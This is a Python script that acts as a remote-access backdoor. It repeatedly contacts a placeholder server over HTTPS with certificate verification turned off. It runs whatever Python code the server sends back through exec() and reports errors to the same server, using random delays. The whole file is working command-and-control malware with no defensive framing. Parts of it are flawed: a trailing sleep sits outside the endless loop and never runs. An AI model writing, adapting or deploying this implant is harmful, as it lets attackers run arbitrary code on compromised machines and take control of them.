import ssl
import json
import time
import random
import requests

# Create a default SSL context and disable hostname verification
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

# Replace these with the actual server address and port
server_address = '<YOUR_SERVER_IP_HERE>'
server_port = '<YOUR_SERVER_PORT_HERE>'

# Construct the full URL for the server
url = f'https://{server_address}:{server_port}/'

while True:
    # Make an HTTPS request to the server
    try:
        response = requests.get(url, verify=False)

        # Check the status code of the response
        if response.status_code != 200:
            continue

        # Load the response payload as JSON
        payload = response.json()

        # If the payload contains a 'command' field, execute the command
        if 'command' in payload:
            try:
                # Execute the command
                exec(payload['command'])
            except Exception as e:
                # If an exception is raised, send the exception message back to the server
                data = {'exception': str(e)}
                requests.post(url, json=data)
    except Exception as e:
        # If an error occurs while making the request, wait for a while before trying again
        time.sleep(random.uniform(60, 120))

# Wait for a random interval before making the next request
time.sleep(random.uniform(5, 15))
